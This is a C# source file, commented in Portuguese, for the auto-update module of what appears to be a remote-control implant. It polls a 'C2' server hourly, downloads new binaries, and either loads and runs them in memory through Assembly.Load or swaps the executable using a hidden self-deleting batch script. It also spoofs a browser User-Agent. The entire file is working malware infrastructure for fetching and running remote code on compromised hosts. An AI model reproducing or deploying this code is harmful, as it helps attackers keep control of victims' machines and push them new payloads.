using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading.Tasks;
using System.IO.Compression;
using System.Collections.Generic;

namespace XYZ.modules
{
    /// <summary>
    /// Sistema de auto-atualização automático
    /// Baixa e aplica updates do C2 sem reiniciar
    /// Suporta: In-memory loading, Rollback, Versioning
    /// </summary>
    public class AutoUpdateModule
    {
        private static readonly string UPDATE_ENDPOINT = "api/update/check";
        private static readonly string CURRENT_VERSION = Assembly.GetExecutingAssembly().GetName().Version.ToString();
        private static readonly string BACKUP_PATH = Path.Combine(Path.GetTempPath(), "xyz_backup.exe");
        
        private static bool isUpdating = false;
        
        public AutoUpdateModule()
        {
            SecureLogger.LogInfo("AutoUpdate", string.Format("Auto-update module initialized. Current version: {0}", CURRENT_VERSION));
        }

        /// <summary>
        /// Verifica updates disponíveis
        /// </summary>
        public async Task<UpdateInfo> CheckForUpdates()
        {
            try
            {
                SecureLogger.LogInfo("AutoUpdate", "Checking for updates...");

                string response = await ResilientC2Communication.GetData(UPDATE_ENDPOINT);
                
                if (string.IsNullOrEmpty(response))
                    return null;

                var updateInfo = new System.Web.Script.Serialization.JavaScriptSerializer()
                    .Deserialize<UpdateInfo>(response);

                if (IsNewerVersion(updateInfo.Version, CURRENT_VERSION))
                {
                    SecureLogger.LogInfo("AutoUpdate", string.Format("New version available: {0}", updateInfo.Version));
                    return updateInfo;
                }
                else
                {
                    SecureLogger.LogInfo("AutoUpdate", "Already up to date");
                    return null;
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("AutoUpdate.Check", ex);
                return null;
            }
        }

        /// <summary>
        /// Aplica update automaticamente
        /// </summary>
        public async Task<bool> ApplyUpdate(UpdateInfo updateInfo)
        {
            if (isUpdating)
            {
                SecureLogger.LogWarning("AutoUpdate", "Update already in progress");
                return false;
            }

            isUpdating = true;

            try
            {
                SecureLogger.LogInfo("AutoUpdate", string.Format("Downloading update v{0}...", updateInfo.Version));

                // 1. Faz backup do executável atual
                BackupCurrentExecutable();

                // 2. Baixa novo executável
                byte[] newExecutable = await DownloadUpdate(updateInfo.DownloadUrl);

                if (newExecutable == null || newExecutable.Length == 0)
                {
                    SecureLogger.LogError("AutoUpdate", new Exception("Downloaded file is empty"));
                    return false;
                }

                // 3. Verifica integridade (HMAC)
                if (!VerifyIntegrity(newExecutable, updateInfo.Checksum))
                {
                    SecureLogger.LogError("AutoUpdate", new Exception("Integrity check failed"));
                    return false;
                }

                // 4. Aplica update (in-memory ou via substituição de arquivo)
                if (updateInfo.InMemoryUpdate)
                {
                    return ApplyInMemoryUpdate(newExecutable);
                }
                else
                {
                    return ApplyFileUpdate(newExecutable);
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("AutoUpdate.Apply", ex);
                
                // Rollback em caso de erro
                Rollback();
                
                return false;
            }
            finally
            {
                isUpdating = false;
            }
        }

        /// <summary>
        /// Faz backup do executável atual
        /// </summary>
        private void BackupCurrentExecutable()
        {
            try
            {
                string currentPath = Assembly.GetExecutingAssembly().Location;
                
                if (File.Exists(currentPath))
                {
                    File.Copy(currentPath, BACKUP_PATH, true);
                    SecureLogger.LogInfo("AutoUpdate", "Backup created successfully");
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("AutoUpdate.Backup", ex);
            }
        }

        /// <summary>
        /// Baixa update do C2
        /// </summary>
        private async Task<byte[]> DownloadUpdate(string downloadUrl)
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    // Se URL relativo, usa C2 base
                    if (!downloadUrl.StartsWith("http"))
                    {
                        downloadUrl = string.Format("{0}/{1}", ResilientC2Communication.GetBaseUrl(), downloadUrl);
                    }

                    client.Headers.Add("User-Agent", "Mozilla/5.0");
                    
                    byte[] data = await client.DownloadDataTaskAsync(downloadUrl);
                    
                    SecureLogger.LogInfo("AutoUpdate", string.Format("Downloaded {0} bytes", data.Length));
                    
                    return data;
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("AutoUpdate.Download", ex);
                return null;
            }
        }

        /// <summary>
        /// Verifica integridade do arquivo
        /// </summary>
        private bool VerifyIntegrity(byte[] data, string expectedChecksum)
        {
            try
            {
                string actualChecksum = SecurityUtilities.SHA256Hash(Convert.ToBase64String(data));
                
                bool isValid = actualChecksum.Equals(expectedChecksum, StringComparison.OrdinalIgnoreCase);
                
                if (isValid)
                {
                    SecureLogger.LogInfo("AutoUpdate", "Integrity check passed");
                }
                else
                {
                    SecureLogger.LogError("AutoUpdate", new Exception(string.Format("Checksum mismatch. Expected: {0}, Got: {1}", expectedChecksum, actualChecksum)));
                }
                
                return isValid;
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("AutoUpdate.Verify", ex);
                return false;
            }
        }

        /// <summary>
        /// Aplica update in-memory (sem reiniciar)
        /// </summary>
        private bool ApplyInMemoryUpdate(byte[] newExecutable)
        {
            try
            {
                SecureLogger.LogInfo("AutoUpdate", "Applying in-memory update...");

                // Carrega assembly na memória
                Assembly newAssembly = Assembly.Load(newExecutable);
                
                // Encontra entry point
                MethodInfo entryPoint = newAssembly.EntryPoint;
                
                if (entryPoint == null)
                {
                    SecureLogger.LogError("AutoUpdate", new Exception("Entry point not found"));
                    return false;
                }

                // Executa novo código em thread separada
                Task.Run(() =>
                {
                    try
                    {
                        entryPoint.Invoke(null, new object[] { new string[0] });
                    }
                    catch (Exception ex)
                    {
                        SecureLogger.LogError("AutoUpdate.InMemoryExec", ex);
                    }
                });

                SecureLogger.LogInfo("AutoUpdate", "In-memory update applied successfully");
                return true;
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("AutoUpdate.InMemory", ex);
                return false;
            }
        }

        /// <summary>
        /// Aplica update substituindo arquivo (requer reinício)
        /// </summary>
        private bool ApplyFileUpdate(byte[] newExecutable)
        {
            try
            {
                SecureLogger.LogInfo("AutoUpdate", "Applying file update...");

                string currentPath = Assembly.GetExecutingAssembly().Location;
                string tempUpdatePath = currentPath + ".update";

                // Salva novo executável
                File.WriteAllBytes(tempUpdatePath, newExecutable);

                // Cria script de atualização
                string updateScript = CreateUpdateScript(currentPath, tempUpdatePath);

                // Executa script e sai
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = string.Format("/c \"{0}\"", updateScript),
                    CreateNoWindow = true,
                    UseShellExecute = false
                });

                SecureLogger.LogInfo("AutoUpdate", "Update script started. Exiting...");
                
                // Aguarda script iniciar
                System.Threading.Thread.Sleep(1000);
                
                // Encerra processo atual
                Environment.Exit(0);

                return true;
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("AutoUpdate.FileUpdate", ex);
                return false;
            }
        }

        /// <summary>
        /// Cria script batch para substituir executável
        /// </summary>
        private string CreateUpdateScript(string currentPath, string tempUpdatePath)
        {
            string scriptPath = Path.Combine(Path.GetTempPath(), "xyz_update.bat");

            // Batch script with placeholders
            string script = string.Format(
                "@echo off\r\n" +
                "timeout /t 2 /nobreak > nul\r\n" +
                "del /f /q \"{0}\"\r\n" +
                "move /y \"{1}\" \"{0}\"\r\n" +
                "start \"\" \"{0}\"\r\n" +
                "del /f /q \"{2}\"\r\n" +
                "exit", 
                currentPath, tempUpdatePath, scriptPath);

            File.WriteAllText(scriptPath, script);
            return scriptPath;
        }

        /// <summary>
        /// Rollback para versão anterior
        /// </summary>
        private void Rollback()
        {
            try
            {
                if (File.Exists(BACKUP_PATH))
                {
                    SecureLogger.LogInfo("AutoUpdate", "Performing rollback...");

                    string currentPath = Assembly.GetExecutingAssembly().Location;
                    
                    File.Copy(BACKUP_PATH, currentPath, true);
                    File.Delete(BACKUP_PATH);

                    SecureLogger.LogInfo("AutoUpdate", "Rollback completed");
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("AutoUpdate.Rollback", ex);
            }
        }

        /// <summary>
        /// Compara versões
        /// </summary>
        private bool IsNewerVersion(string newVersion, string currentVersion)
        {
            try
            {
                Version vNew = new Version(newVersion);
                Version vCurrent = new Version(currentVersion);

                return vNew > vCurrent;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Inicia verificação automática periódica
        /// </summary>
        public void StartAutoCheck(int intervalSeconds = 3600)
        {
            Task.Run(async () =>
            {
                while (true)
                {
                    try
                    {
                        await Task.Delay(intervalSeconds * 1000);

                        var updateInfo = await CheckForUpdates();

                        if (updateInfo != null && updateInfo.AutoApply)
                        {
                            SecureLogger.LogInfo("AutoUpdate", "Auto-applying update...");
                            await ApplyUpdate(updateInfo);
                        }
                    }
                    catch (Exception ex)
                    {
                        SecureLogger.LogError("AutoUpdate.AutoCheck", ex);
                    }
                }
            });

            SecureLogger.LogInfo("AutoUpdate", string.Format("Auto-check started (interval: {0}s)", intervalSeconds));
        }
    }

    /// <summary>
    /// Informações de update
    /// </summary>
    public class UpdateInfo
    {
        public string Version { get; set; }
        public string DownloadUrl { get; set; }
        public string Checksum { get; set; }
        public bool InMemoryUpdate { get; set; }
        public bool AutoApply { get; set; }
        public string ReleaseNotes { get; set; }
        public DateTime ReleasedAt { get; set; }
    }
}
